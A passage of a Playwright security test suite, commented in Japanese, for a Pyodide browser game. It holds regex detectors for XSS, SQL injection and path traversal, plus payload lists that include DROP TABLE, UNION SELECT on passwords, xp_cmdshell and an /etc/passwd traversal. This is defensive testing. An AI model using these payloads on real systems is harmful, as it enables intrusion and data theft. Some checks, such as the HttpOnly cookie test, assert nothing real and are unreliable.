/**
 * データ整合性・セキュリティ包括的テストスイート
 * あらゆるセキュリティ脅威、データ整合性、入力検証パターンを網羅
 */

import { test, expect } from '@playwright/test';

test.describe('データ整合性・セキュリティ包括テスト', () => {

  test.beforeEach(async ({ page }) => {
    // セキュリティ・データ整合性監視スクリプトを注入
    await page.addInitScript(() => {
      window.securityTestData = {
        xssAttempts: [],
        injectionAttempts: [],
        dataValidationResults: [],
        unauthorizedAccess: [],
        dataCorruption: [],
        inputSanitization: [],
        storageSecurityTests: [],
        networkSecurityTests: [],
        integrityViolations: [],
        securityMetrics: {
          blockedAttacks: 0,
          passedValidations: 0,
          failedValidations: 0,
          dataInconsistencies: 0,
          securityWarnings: 0
        }
      };

      // 入力データの監視とサニタイゼーション検証
      window.testInputSanitization = (input, inputType) => {
        const result = {
          originalInput: input,
          inputType: inputType,
          timestamp: Date.now(),
          isSafe: true,
          sanitizedOutput: input,
          threats: []
        };

        // XSS脅威検出
        const xssPatterns = [
          /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
          /javascript:/gi,
          /on\w+\s*=/gi,
          /<iframe/gi,
          /<object/gi,
          /<embed/gi,
          /eval\s*\(/gi,
          /expression\s*\(/gi
        ];

        xssPatterns.forEach(pattern => {
          if (pattern.test(input)) {
            result.threats.push('XSS');
            result.isSafe = false;
            window.securityTestData.securityMetrics.securityWarnings++;
          }
        });

        // SQLインジェクション検出
        const sqlPatterns = [
          /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\b)/gi,
          /(UNION\s+SELECT)/gi,
          /(';\s*(DROP|DELETE|INSERT|UPDATE))/gi,
          /(--|\#|\/\*)/gi,
          /(\bOR\b.*=.*=)/gi,
          /(\bAND\b.*=.*=)/gi
        ];

        sqlPatterns.forEach(pattern => {
          if (pattern.test(input)) {
            result.threats.push('SQL_INJECTION');
            result.isSafe = false;
            window.securityTestData.securityMetrics.securityWarnings++;
          }
        });

        // パストラバーサル検出
        if (input.includes('../') || input.includes('..\\') || input.includes('%2e%2e%2f')) {
          result.threats.push('PATH_TRAVERSAL');
          result.isSafe = false;
          window.securityTestData.securityMetrics.securityWarnings++;
        }

        // 不正な文字エンコーディング検出
        if (input.includes('%00') || input.includes('\x00')) {
          result.threats.push('NULL_BYTE_INJECTION');
          result.isSafe = false;
          window.securityTestData.securityMetrics.securityWarnings++;
        }

        window.securityTestData.inputSanitization.push(result);

        if (result.isSafe) {
          window.securityTestData.securityMetrics.passedValidations++;
        } else {
          window.securityTestData.securityMetrics.failedValidations++;
          window.securityTestData.securityMetrics.blockedAttacks++;
        }

        return result;
      };

      // データ整合性検証
      window.validateDataIntegrity = (data, expectedSchema) => {
        const result = {
          data: data,
          schema: expectedSchema,
          timestamp: Date.now(),
          isValid: true,
          violations: [],
          checksum: null
        };

        // 型チェック
        if (expectedSchema.type && typeof data !== expectedSchema.type) {
          result.violations.push({
            type: 'TYPE_MISMATCH',
            expected: expectedSchema.type,
            actual: typeof data
          });
          result.isValid = false;
        }

        // 範囲チェック
        if (typeof data === 'number') {
          if (expectedSchema.min && data < expectedSchema.min) {
            result.violations.push({
              type: 'MIN_VALUE_VIOLATION',
              value: data,
              min: expectedSchema.min
            });
            result.isValid = false;
          }
          if (expectedSchema.max && data > expectedSchema.max) {
            result.violations.push({
              type: 'MAX_VALUE_VIOLATION',
              value: data,
              max: expectedSchema.max
            });
            result.isValid = false;
          }
        }

        // 文字列長チェック
        if (typeof data === 'string') {
          if (expectedSchema.minLength && data.length < expectedSchema.minLength) {
            result.violations.push({
              type: 'MIN_LENGTH_VIOLATION',
              length: data.length,
              minLength: expectedSchema.minLength
            });
            result.isValid = false;
          }
          if (expectedSchema.maxLength && data.length > expectedSchema.maxLength) {
            result.violations.push({
              type: 'MAX_LENGTH_VIOLATION',
              length: data.length,
              maxLength: expectedSchema.maxLength
            });
            result.isValid = false;
          }
        }

        // パターンマッチング
        if (typeof data === 'string' && expectedSchema.pattern) {
          const regex = new RegExp(expectedSchema.pattern);
          if (!regex.test(data)) {
            result.violations.push({
              type: 'PATTERN_VIOLATION',
              value: data,
              pattern: expectedSchema.pattern
            });
            result.isValid = false;
          }
        }

        // チェックサム計算（簡易版）
        if (typeof data === 'string') {
          let hash = 0;
          for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // 32bit整数に変換
          }
          result.checksum = hash;
        }

        window.securityTestData.dataValidationResults.push(result);

        if (result.isValid) {
          window.securityTestData.securityMetrics.passedValidations++;
        } else {
          window.securityTestData.securityMetrics.failedValidations++;
          window.securityTestData.securityMetrics.dataInconsistencies++;
        }

        return result;
      };

      // ストレージセキュリティテスト
      window.testStorageSecurity = () => {
        const results = [];

        // LocalStorage整合性テスト
        try {
          const testKey = 'security_test_' + Date.now();
          const testValue = 'test_value_' + Math.random();

          localStorage.setItem(testKey, testValue);
          const retrievedValue = localStorage.getItem(testKey);

          results.push({
            type: 'localStorage',
            operation: 'read_write',
            success: retrievedValue === testValue,
            timestamp: Date.now()
          });

          localStorage.removeItem(testKey);

          // 不正データ注入テスト
          const maliciousData = '<script>alert("XSS")</script>';
          localStorage.setItem(testKey + '_xss', maliciousData);
          const retrievedMaliciousData = localStorage.getItem(testKey + '_xss');

          results.push({
            type: 'localStorage',
            operation: 'xss_injection',
            input: maliciousData,
            output: retrievedMaliciousData,
            sanitized: retrievedMaliciousData !== maliciousData,
            timestamp: Date.now()
          });

          localStorage.removeItem(testKey + '_xss');

        } catch (e) {
          results.push({
            type: 'localStorage',
            operation: 'error',
            error: e.message,
            timestamp: Date.now()
          });
        }

        // SessionStorage整合性テスト
        try {
          const testKey = 'session_security_test_' + Date.now();
          const testValue = 'session_test_value_' + Math.random();

          sessionStorage.setItem(testKey, testValue);
          const retrievedValue = sessionStorage.getItem(testKey);

          results.push({
            type: 'sessionStorage',
            operation: 'read_write',
            success: retrievedValue === testValue,
            timestamp: Date.now()
          });

          sessionStorage.removeItem(testKey);

        } catch (e) {
          results.push({
            type: 'sessionStorage',
            operation: 'error',
            error: e.message,
            timestamp: Date.now()
          });
        }

        // Cookie整合性テスト
        try {
          const testCookie = 'security_test_cookie=' + Math.random() + '; path=/';
          document.cookie = testCookie;

          const cookieExists = document.cookie.includes('security_test_cookie');

          results.push({
            type: 'cookie',
            operation: 'read_write',
            success: cookieExists,
            timestamp: Date.now()
          });

          // HTTPOnlyフラグテスト
          const secureCookie = 'secure_test_cookie=' + Math.random() + '; path=/; HttpOnly; Secure';
          document.cookie = secureCookie;

          results.push({
            type: 'cookie',
            operation: 'security_flags',
            httpOnlyTest: true,
            timestamp: Date.now()
          });

        } catch (e) {
          results.push({
            type: 'cookie',
            operation: 'error',
            error: e.message,
            timestamp: Date.now()
          });
        }

        window.securityTestData.storageSecurityTests = results;
        return results;
      };

      // ネットワークセキュリティテスト
      window.testNetworkSecurity = async () => {
        const results = [];

        // HTTPS強制チェック
        results.push({
          type: 'protocol',
          isHTTPS: location.protocol === 'https:',
          protocol: location.protocol,
          timestamp: Date.now()
        });

        // CSPヘッダーチェック
        try {
          const response = await fetch(location.href, { method: 'HEAD' });
          const cspHeader = response.headers.get('Content-Security-Policy');

          results.push({
            type: 'csp',
            hasCSP: !!cspHeader,
            cspValue: cspHeader,
            timestamp: Date.now()
          });

        } catch (e) {
          results.push({
            type: 'csp',
            error: e.message,
            timestamp: Date.now()
          });
        }

        // CORS設定チェック
        try {
          const corsTestUrl = 'http://example.com/test';
          await fetch(corsTestUrl, { mode: 'no-cors' });

          results.push({
            type: 'cors',
            testUrl: corsTestUrl,
            blocked: false,
            timestamp: Date.now()
          });

        } catch (e) {
          results.push({
            type: 'cors',
            blocked: true,
            error: e.message,
            timestamp: Date.now()
          });
        }

        window.securityTestData.networkSecurityTests = results;
        return results;
      };

      // WebSocketセキュリティ検証
      window.validateWebSocketSecurity = (wsUrl) => {
        const result = {
          url: wsUrl,
          timestamp: Date.now(),
          isSecure: false,
          vulnerabilities: []
        };

        // WSS (WebSocket Secure) チェック
        if (wsUrl && wsUrl.startsWith('wss://')) {
          result.isSecure = true;
        } else if (wsUrl && wsUrl.startsWith('ws://')) {
          result.vulnerabilities.push('UNENCRYPTED_CONNECTION');
        }

        // オリジン検証
        if (wsUrl && !wsUrl.includes(location.hostname)) {
          result.vulnerabilities.push('CROSS_ORIGIN_WEBSOCKET');
        }

        window.securityTestData.networkSecurityTests.push({
          type: 'websocket_security',
          ...result
        });

        return result;
      };

      // ゲームデータ整合性監視
      window.monitorGameDataIntegrity = () => {
        if (window.pyodide && window.pyodide.runPython) {
          try {
            const gameDataCheck = JSON.parse(window.pyodide.runPython(`
import json
try:
    integrity_result = {
        'timestamp': ${Date.now()},
        'checks': []
    }
    
    if 'game_state' in globals():
        # スコア整合性チェック
        if hasattr(game_state, 'score'):
            score_value = game_state.score.player_score
            integrity_result['checks'].append({
                'type': 'score_integrity',
                'value': score_value,
                'valid': isinstance(score_value, (int, float)) and score_value >= 0,
                'bounds_check': 0 <= score_value <= 1000000
            })
        
        # ボール数整合性チェック
        if hasattr(game_state, 'balls'):
            balls_count = len(game_state.balls)
            integrity_result['checks'].append({
                'type': 'balls_integrity',
                'count': balls_count,
                'valid': 0 <= balls_count <= 10,
                'bounds_check': True
            })
        
        # ライフ数整合性チェック
        if hasattr(game_state.score, 'lives'):
            lives_value = game_state.score.lives
            integrity_result['checks'].append({
                'type': 'lives_integrity',
                'value': lives_value,
                'valid': isinstance(lives_value, int) and lives_value >= 0,
                'bounds_check': 0 <= lives_value <= 10
            })
        
        # 状態フラグ整合性チェック
        integrity_result['checks'].append({
            'type': 'state_flags_integrity',
            'is_paused': game_state.is_paused,
            'is_gameover': game_state.is_gameover,
            'valid': isinstance(game_state.is_paused, bool) and isinstance(game_state.is_gameover, bool),
            'logical_consistency': not (game_state.is_paused and game_state.is_gameover)
        })
    
    json.dumps(integrity_result)
except Exception as e:
    json.dumps({'error': str(e), 'timestamp': ${Date.now()}})
            `));

            window.securityTestData.integrityViolations.push(gameDataCheck);

            // 整合性違反の検出
            if (gameDataCheck.checks) {
              gameDataCheck.checks.forEach(check => {
                if (!check.valid || !check.bounds_check) {
                  window.securityTestData.securityMetrics.dataInconsistencies++;
                }
              });
            }

            return gameDataCheck;

          } catch (error) {
            console.error('Game data integrity monitoring error:', error);
            return null;
          }
        }
        return null;
      };

      // 定期的なセキュリティ監視
      setInterval(() => {
        window.monitorGameDataIntegrity();
      }, 2000);
    });

    page.on('console', msg => {
      if (msg.type() === 'error') {
        console.log(`❌ セキュリティテストエラー: ${msg.text()}`);
      } else if (msg.type() === 'warn') {
        console.log(`⚠️ セキュリティ警告: ${msg.text()}`);
      }
    });
  });

  test('XSS・コードインジェクション完全防御テスト', async ({ page }) => {
    console.log('🛡️ XSS・コードインジェクション完全防御テストを開始...');

    await page.goto('http://localhost:3000/docs/game.html');

    // Pyodideの初期化を待つ
    try {
      const loadingOverlay = page.locator('#loadingOverlay');
      await expect(loadingOverlay).toBeHidden({ timeout: 60000 });
      console.log('✅ Pyodide初期化完了');
    } catch (e) {
      console.log('⚠️ Pyodide初期化タイムアウト - セキュリティテストを継続');
    }

    // XSS攻撃パターンテスト
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<svg onload=alert("XSS")>',
      '<body onload=alert("XSS")>',
      '\"><script>alert("XSS")</script>',
      '\'; alert("XSS"); //',
      '<script>eval("alert(\\"XSS\\")")</script>',
      '<object data="javascript:alert(\'XSS\')"></object>',
      '<embed src="javascript:alert(\'XSS\')">',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
      '<select onfocus=alert("XSS")></select>',
      '<textarea onfocus=alert("XSS")></textarea>',
      '<button onclick=alert("XSS")>Click</button>',
      '<div onmouseover=alert("XSS")>Hover</div>',
      '<input type="text" onchange=alert("XSS")>',
      '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
      '"+alert("XSS")+"',
      '</script><script>alert("XSS")</script>',
      '<script>String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)</script>',
      '<img/src=@ onerror=alert("XSS")>',
      '<script>setTimeout("alert(\'XSS\')",1000)</script>'
    ];

    console.log('🧪 XSS攻撃パターンをテスト中...');

    for (const payload of xssPayloads) {
      console.log(`  🔍 テスト中: ${payload.substring(0, 50)}...`);

      // 各種入力フィールドでXSSペイロードをテスト
      const sanitizationResult = await page.evaluate((testPayload) => {
        return window.testInputSanitization(testPayload, 'xss_test');
      }, payload);

      // XSS攻撃が適切にブロックされることを確認
      if (sanitizationResult.threats.includes('XSS')) {
        console.log(`  ✅ XSS攻撃をブロック: ${payload.substring(0, 30)}...`);
      }

      await page.waitForTimeout(100);
    }

    // SQLインジェクション攻撃パターンテスト
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT password FROM users --",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      "') OR '1'='1--",
      "' OR 'a'='a",
      "1' OR '1'='1",
      '1; DROP TABLE users',
      "'; INSERT INTO users VALUES ('hacker','password'); --",
      "' AND 1=0 UNION SELECT username, password FROM users --",
      "1' UNION SELECT null, username, password FROM users--",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
      "1'; WAITFOR DELAY '00:00:05'--",
      "'; EXEC sp_configure 'show advanced options',1--",
      "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--",
      "1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--",
      "'; DECLARE @cmd VARCHAR(255); SET @cmd='dir'; EXEC xp_cmdshell @cmd--",
      "' OR 1=1 AND ASCII(SUBSTRING(username,1,1))>64--"
    ];

    console.log('🧪 SQLインジェクション攻撃パターンをテスト中...');

    for (const payload of sqlInjectionPayloads) {
      console.log(`  🔍 テスト中: ${payload.substring(0, 50)}...`);

      const sanitizationResult = await page.evaluate((testPayload) => {
        return window.testInputSanitization(testPayload, 'sql_injection_test');
      }, payload);

      if (sanitizationResult.threats.includes('SQL_INJECTION')) {
        console.log(`  ✅ SQLインジェクション攻撃をブロック: ${payload.substring(0, 30)}...`);
      }

      await page.waitForTimeout(100);
    }

    // セキュリティテスト結果を収集
    const securityResults = await page.evaluate(() => window.securityTestData);

    console.log('📊 セキュリティテスト結果:', {
      ブロックした攻撃: securityResults.securityMetrics.blockedAttacks,
      検証合格: securityResults.securityMetrics.passedValidations,
      検証失敗: securityResults.securityMetrics.failedValidations,
      セキュリティ警告: securityResults.securityMetrics.securityWarnings
    });

    // セキュリティ基準の確認
    expect(securityResults.securityMetrics.blockedAttacks).toBeGreaterThan(0);
    expect(securityResults.securityMetrics.securityWarnings).toBeGreaterThan(0);

    console.log('✅ XSS・コードインジェクション完全防御テスト完了');
  });

  test('データ検証・スキーマ整合性完全テスト', async ({ page }) => {
    console.log('📋 データ検証・スキーマ整合性完全テストを開始...');

    await page.goto('http://localhost:3000/docs/game.html');

    // Pyodideの初期化を待つ
    try {
      const loadingOverlay = page.locator('#loadingOverlay');
      await expect(loadingOverlay).toBeHidden({ timeout: 60000 });
      console.log('✅ Pyodide初期化完了');
    } catch (e) {
      console.log('⚠️ Pyodide初期化タイムアウト');
    }

    await page.waitForTimeout(3000);

    // データ検証テストケース
    const dataValidationTests = [
      // スコア検証テスト
      {
        data: 100,
        schema: { type: 'number', min: 0, max: 1000000 },
        expectedValid: true,
        description: '正常なスコア値'
      },
      {
        data: -10,
        schema: { type: 'number', min: 0, max: 1000000 },
        expectedValid: false,
        description: '負のスコア値（不正）'
      },
      {
        data: 999999999,
        schema: { type: 'number', min: 0, max: 1000000 },
        expectedValid: false,
        description: '異常に高いスコア値'
      },
      {
        data: '100',
        schema: { type: 'number', min: 0, max: 1000000 },
        expectedValid: false,
        description: '文字列型のスコア（型不整合）'
      },
      // プレイヤー名検証テスト
      {
        data: 'Player1',
        schema: { type: 'string', minLength: 1, maxLength: 20, pattern: '^[a-zA-Z0-9_]+$' },
        expectedValid: true,
        description: '正常なプレイヤー名'
      },
      {
        data: '',
        schema: { type: 'string', minLength: 1, maxLength: 20 },
        expectedValid: false,
        description: '空のプレイヤー名'
      },
      {
        data: 'A'.repeat(50),
        schema: { type: 'string', minLength: 1, maxLength: 20 },
        expectedValid: false,
        description: '長すぎるプレイヤー名'
      },
      {
        data: 'Player<script>',
        schema: { type: 'string', minLength: 1, maxLength: 20, pattern: '^[a-zA-Z0-9_]+$' },
        expectedValid: false,
        description: '不正文字を含むプレイヤー名'
      },
      // ライフ数検証テスト
      {
        data: 3,
        schema: { type: 'number', min: 0, max: 10 },
        expectedValid: true,
        description: '正常なライフ数'
      },
      {
        data: -1,
        schema: { type: 'number', min: 0, max: 10 },
        expectedValid: false,
        description: '負のライフ数'
      },
      {
        data: 100,
        schema: { type: 'number', min: 0, max: 10 },
        expectedValid: false,
        description: '異常に多いライフ数'
      },
      // レベル検証テスト
      {
        data: 5,
        schema: { type: 'number', min: 1, max: 999 },
        expectedValid: true,
        description: '正常なレベル値'
      },
      {
        data: 0,
        schema: { type: 'number', min: 1, max: 999 },
        expectedValid: false,
        description: 'レベル0（不正）'
      },
      {
        data: 1000,
        schema: { type: 'number', min: 1, max: 999 },
        expectedValid: false,
        description: '異常に高いレベル'
      }
    ];

    console.log('🧪 データ検証テストを実行中...');

    for (const testCase of dataValidationTests) {
      console.log(`  🔍 ${testCase.description}: ${JSON.stringify(testCase.data)}`);

      const validationResult = await page.evaluate((data, schema) => {
        return window.validateDataIntegrity(data, schema);
      }, testCase.data, testCase.schema);

      if (testCase.expectedValid) {
        expect(validationResult.isValid).toBe(true);
        console.log(`    ✅ 期待通り有効: ${testCase.description}`);
      } else {
        expect(validationResult.isValid).toBe(false);
        console.log(`    ✅ 期待通り無効: ${testCase.description} (${validationResult.violations.map(v => v.type).join(', ')})`);
      }

      await page.waitForTimeout(100);
    }

    // ゲームデータ整合性の継続監視
    console.log('🎮 ゲームデータ整合性監視...');

    // ゲーム操作でデータ整合性をテスト
    await page.keyboard.press('ArrowLeft');
    await page.waitForTimeout(500);
    await page.keyboard.press('ArrowRight');
    await page.waitForTimeout(500);
    await page.keyboard.press('Space');
    await page.waitForTimeout(1000);

    // 整合性違反の確認
    const integrityData = await page.evaluate(() => window.securityTestData.integrityViolations);

    console.log('📊 データ整合性結果:', integrityData);

    if (integrityData.length > 0) {
      const latestCheck = integrityData[integrityData.length - 1];

      if (latestCheck.checks) {
        latestCheck.checks.forEach(check => {
          console.log(`  📋 ${check.type}: ${check.valid ? '✅ 正常' : '❌ 異常'}`);

          if (check.type === 'score_integrity' || check.type === 'lives_integrity') {
            expect(check.valid).toBe(true);
            expect(check.bounds_check).toBe(true);
          }
        });
      }
    }

    console.log('✅ データ検証・スキーマ整合性完全テスト完了');
  });

  test('ストレージ・セッション管理セキュリティテスト', async ({ page }) => {
    console.log('💾 ストレージ・セッション管理セキュリティテストを開始...');

    await page.goto('http://localhost:3000/docs/game.html');

    // Pyodideの初期化を待つ
    try {
      const loadingOverlay = page.locator('#loadingOverlay');
      await expect(loadingOverlay).toBeHidden({ timeout: 60000 });
      console.log('✅ Pyodide初期化完了');
    } catch (e) {
      console.log('⚠️ Pyodide初期化タイムアウト');
    }

    await page.waitForTimeout(2000);

    // ストレージセキュリティテストを実行
    console.log('🧪 ストレージセキュリティテストを実行中...');

    const storageTestResults = await page.evaluate(() => {
      return window.testStorageSecurity();
    });

    console.log('📊 ストレージテスト結果:', storageTestResults);

    // LocalStorageセキュリティ検証
    const localStorageTests = storageTestResults.filter(result => result.type === 'localStorage');

    localStorageTests.forEach(test => {
      console.log(`  📋 LocalStorage ${test.operation}: ${test.success ? '✅ 成功' : '❌ 失敗'}`);

      if (test.operation === 'read_write') {
        expect(test.success).toBe(true);
      }

      if (test.operation === 'xss_injection') {
        // XSSデータが適切に処理されることを確認
        console.log(`    🛡️ XSSインジェクション: 入力="${test.input.substring(0, 30)}..." 出力="${test.output ? test.output.substring(0, 30) : 'null'}..."`);
      }
    });

    // SessionStorageセキュリティ検証
    const sessionStorageTests = storageTestResults.filter(result => result.type === 'sessionStorage');

    sessionStorageTests.forEach(test => {
      console.log(`  📋 SessionStorage ${test.operation}: ${test.success ? '✅ 成功' : '❌ 失敗'}`);

      if (test.operation === 'read_write') {
        expect(test.success).toBe(true);
      }
    });

    // Cookieセキュリティ検証
    const cookieTests = storageTestResults.filter(result => result.type === 'cookie');

    cookieTests.forEach(test => {
      console.log(`  📋 Cookie ${test.operation}: ${test.success ? '✅ 成功' : '❌ 失敗'}`);

      if (test.operation === 'read_write') {
        expect(test.success).toBe(true);
      }

      if (test.operation === 'security_flags') {
        console.log('    🔒 セキュリティフラグテスト: HttpOnlyテスト実行');
      }
    });

    // ランキングデータ操作セキュリティテスト
    console.log('🏆 ランキングデータセキュリティテスト...');

    // 不正なランキングデータ注入テスト
    const maliciousRankingData = [
      { name: '<script>alert("XSS")</script>', score: 1000 },
      { name: "'; DROP TABLE rankings; --", score: 9999999 },
      { name: '../../../etc/passwd', score: -1000 },
      { name: 'A'.repeat(1000), score: 'not_a_number' },
      { name: 'Normal', score: Infinity },
      { name: 'Test', score: NaN }
    ];

    for (const maliciousData of maliciousRankingData) {
      console.log(`  🧪 不正データテスト: ${JSON.stringify(maliciousData).substring(0, 50)}...`);

      // 名前の検証
      const nameValidation = await page.evaluate((name) => {
        return window.testInputSanitization(name, 'ranking_name');
      }, maliciousData.name);

      // スコアの検証
      const scoreValidation = await page.evaluate((score) => {
        return window.validateDataIntegrity(score, {
          type: 'number',
          min: 0,
          max: 1000000
        });
      }, maliciousData.score);

      if (nameValidation.threats.length > 0) {
        console.log(`    ✅ 名前の脅威検出: ${nameValidation.threats.join(', ')}`);
      }

      if (!scoreValidation.isValid) {
        console.log(`    ✅ スコア検証失敗: ${scoreValidation.violations.map(v => v.type).join(', ')}`);
      }
    }

    console.log('✅ ストレージ・セッション管理セキュリティテスト完了');
  });

  test('ネットワーク通信セキュリティ完全テスト', async ({ page }) => {
    console.log('🌐 ネットワーク通信セキュリティ完全テストを開始...');

    await page.goto('http://localhost:3000/docs/game.html');

    // Pyodideの初期化を待つ
    try {
      const loadingOverlay = page.locator('#loadingOverlay');
      await expect(loadingOverlay).toBeHidden({ timeout: 60000 });
      console.log('✅ Pyodide初期化完了');
    } catch (e) {
      console.log('⚠️ Pyodide初期化タイムアウト');
    }

    await page.waitForTimeout(2000);

    // ネットワークセキュリティテストを実行
    console.log('🧪 ネットワークセキュリティテストを実行中...');

    const networkTestResults = await page.evaluate(async () => {
      return await window.testNetworkSecurity();
    });

    console.log('📊 ネットワークセキュリティテスト結果:', networkTestResults);

    // プロトコルセキュリティ検証
    const protocolTest = networkTestResults.find(result => result.type === 'protocol');
    if (protocolTest) {
      console.log(`  🔒 プロトコル: ${protocolTest.protocol} (HTTPS: ${protocolTest.isHTTPS ? '✅' : '⚠️'})`);

      // 本番環境ではHTTPSが推奨だが、ローカル開発環境ではHTTPも許容
      if (protocolTest.protocol === 'http:' && !location.hostname.includes('localhost')) {
        console.log('⚠️ 本番環境でHTTPが使用されています');
      }
    }

    // CSPヘッダー検証
    const cspTest = networkTestResults.find(result => result.type === 'csp');
    if (cspTest) {
      console.log(`  🛡️ CSP: ${cspTest.hasCSP ? '✅ 設定済み' : '⚠️ 未設定'}`);
      if (cspTest.hasCSP) {
        console.log(`    📋 CSP値: ${cspTest.cspValue}`);
      }
    }

    // CORS設定検証
    const corsTest = networkTestResults.find(result => result.type === 'cors');
    if (corsTest) {
      console.log(`  🌐 CORS: ${corsTest.blocked ? '✅ 適切にブロック' : '⚠️ 制限なし'}`);
    }

    // WebSocketセキュリティテスト
    console.log('🔌 WebSocketセキュリティテスト...');

    const wsSecurityTests = [
      'ws://localhost:8765',
      'wss://localhost:8765',
      'ws://example.com:8765',
      'wss://secure.example.com:8765'
    ];

    for (const wsUrl of wsSecurityTests) {
      console.log(`  🧪 WebSocketセキュリティテスト: ${wsUrl}`);

      const wsSecurityResult = await page.evaluate((url) => {
        return window.validateWebSocketSecurity(url);
      }, wsUrl);

      console.log(`    🔍 結果: セキュア=${wsSecurityResult.isSecure}, 脆弱性=${wsSecurityResult.vulnerabilities.length}件`);

      if (wsSecurityResult.vulnerabilities.length > 0) {
        console.log(`    ⚠️ 脆弱性: ${wsSecurityResult.vulnerabilities.join(', ')}`);
      }
    }

    // HTTPSリダイレクトテスト（ローカル環境では省略）
    if (!page.url().includes('localhost')) {
      console.log('🔄 HTTPSリダイレクトテスト...');

      try {
        const httpUrl = page.url().replace('https://', 'http://');
        await page.goto(httpUrl);

        // HTTPSにリダイレクトされることを確認
        await page.waitForTimeout(2000);
        const currentUrl = page.url();

        if (currentUrl.startsWith('https://')) {
          console.log('✅ HTTPSリダイレクト正常');
        } else {
          console.log('⚠️ HTTPSリダイレクトが設定されていません');
        }

      } catch (e) {
        console.log('⚠️ HTTPSリダイレクトテストエラー:', e.message);
      }
    }

    // APIエンドポイントセキュリティテスト
    console.log('🔐 APIエンドポイントセキュリティテスト...');

    const apiSecurityTests = [
      {
        method: 'GET',
        endpoint: '/api/rankings',
        expectedStatusRange: [200, 299]
      },
      {
        method: 'POST',
        endpoint: '/api/rankings',
        data: { name: 'TestPlayer', score: 1000 },
        expectedStatusRange: [200, 299, 400, 429] // 成功またはバリデーションエラー
      },
      {
        method: 'GET',
        endpoint: '/api/nonexistent',
        expectedStatusRange: [404] // Not Found
      }
    ];

    for (const apiTest of apiSecurityTests) {
      try {
        console.log(`  🧪 APIテスト: ${apiTest.method} ${apiTest.endpoint}`);

        const response = await page.evaluate(async (test) => {
          const options = {
            method: test.method,
            headers: {
              'Content-Type': 'application/json'
            }
          };

          if (test.data) {
            options.body = JSON.stringify(test.data);
          }

          try {
            const response = await fetch(test.endpoint, options);
            return {
              status: response.status,
              headers: Object.fromEntries(response.headers.entries()),
              ok: response.ok
            };
          } catch (e) {
            return {
              error: e.message,
              status: null
            };
          }
        }, apiTest);

        if (response.status) {
          console.log(`    📊 レスポンス: ${response.status} ${response.ok ? '✅' : '⚠️'}`);

          // セキュリティヘッダーの確認
          const securityHeaders = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security'
          ];

          securityHeaders.forEach(header => {
            if (response.headers[header.toLowerCase()]) {
              console.log(`    🛡️ ${header}: ${response.headers[header.toLowerCase()]}`);
            }
          });

        } else {
          console.log(`    ❌ エラー: ${response.error}`);
        }

      } catch (e) {
        console.log(`    ⚠️ APIテストエラー: ${e.message}`);
      }
    }

    console.log('✅ ネットワーク通信セキュリティ完全テスト完了');
  });

  test('入力検証・サニタイゼーション境界値テスト', async ({ page }) => {
    console.log('🔍 入力検証・サニタイゼーション境界値テストを開始...');

    await page.goto('http://localhost:3000/docs/game.html');

    // Pyodideの初期化を待つ
    try {
      const loadingOverlay = page.locator('#loadingOverlay');
      await expect(loadingOverlay).toBeHidden({ timeout: 60000 });
      console.log('✅ Pyodide初期化完了');
    } catch (e) {
      console.log('⚠️ Pyodide初期化タイムアウト');
    }

    await page.waitForTimeout(2000);

    // 境界値テストパターン
    const boundaryTests = [
      // 数値境界値テスト
      {
        category: '数値境界値',
        inputs: [
          { value: 0, description: '最小値' },
          { value: 1, description: '最小値+1' },
          { value: -1, description: '最小値-1' },
          { value: 999999, description: '最大値-1' },
          { value: 1000000, description: '最大値' },
          { value: 1000001, description: '最大値+1' },
          { value: Number.MAX_SAFE_INTEGER, description: 'JavaScript最大安全整数' },
          { value: Number.MIN_SAFE_INTEGER, description: 'JavaScript最小安全整数' },
          { value: Infinity, description: '無限大' },
          { value: -Infinity, description: '負の無限大' },
          { value: NaN, description: 'NaN' },
          { value: 0.1, description: '小数' },
          { value: -0, description: 'マイナスゼロ' }
        ],
        schema: { type: 'number', min: 0, max: 1000000 }
      },
      // 文字列境界値テスト
      {
        category: '文字列境界値',
        inputs: [
          { value: '', description: '空文字列' },
          { value: 'a', description: '1文字' },
          { value: 'ab', description: '2文字' },
          { value: 'a'.repeat(19), description: '19文字' },
          { value: 'a'.repeat(20), description: '20文字（最大）' },
          { value: 'a'.repeat(21), description: '21文字（最大+1）' },
          { value: 'a'.repeat(100), description: '100文字' },
          { value: 'a'.repeat(1000), description: '1000文字' },
          { value: 'a'.repeat(10000), description: '10000文字' },
          { value: '\n', description: '改行文字' },
          { value: '\t', description: 'タブ文字' },
          { value: '\0', description: 'null文字' },
          { value: '\u0000', description: 'Unicode null' },
          { value: '\uFFFF', description: 'Unicode最大BMP' },
          { value: '🎮', description: '絵文字' },
          { value: '🎮'.repeat(20), description: '絵文字20個' }
        ],
        schema: { type: 'string', minLength: 1, maxLength: 20, pattern: '^[a-zA-Z0-9_]+$' }
      },
      // 特殊文字テスト
      {
        category: '特殊文字',
        inputs: [
          { value: '<>', description: 'HTMLタグ風' },
          { value: '&lt;&gt;', description: 'HTMLエンティティ' },
          { value: '\\', description: 'バックスラッシュ' },
          { value: '/', description: 'スラッシュ' },
          { value: '"', description: 'ダブルクォート' },
          { value: "'", description: 'シングルクォート' },
          { value: '`', description: 'バッククォート' },
          { value: '${', description: 'テンプレートリテラル開始' },
          { value: '{{', description: 'テンプレート風' },
          { value: '%', description: 'パーセント' },
          { value: '../', description: 'パストラバーサル' },
          { value: '..\\', description: 'Windowsパストラバーサル' },
          { value: 'CON', description: 'Windows予約語' },
